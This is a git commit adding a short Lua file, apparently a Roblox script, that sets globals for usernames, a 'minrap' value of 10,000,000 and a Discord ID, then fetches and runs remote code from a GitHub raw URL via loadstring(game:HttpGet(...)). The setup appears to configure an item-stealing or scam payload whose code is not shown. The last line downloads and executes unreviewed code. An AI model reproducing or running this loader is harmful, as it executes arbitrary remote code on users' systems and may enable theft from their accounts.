e5159a118d964c0d48e0040816b2c53d885cf31f
zaliveee <standrise630@gmail.com>
2025-01-16 20:19:04 +0300

    Create test2346.lua

---
+++ test2346.lua
@@ -0,0 +1,6 @@
+_G.Username = "fjjfjjfjjfjjfjjjj"
+_G.Username2 = "fjjfjjfjjfjjfjjjj"
+_G.minrap = 10000000
+_G.discuser = "702437538228600832" -- change to your discord id
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/zaliveee/test666/refs/heads/main/test11123.lua'))()
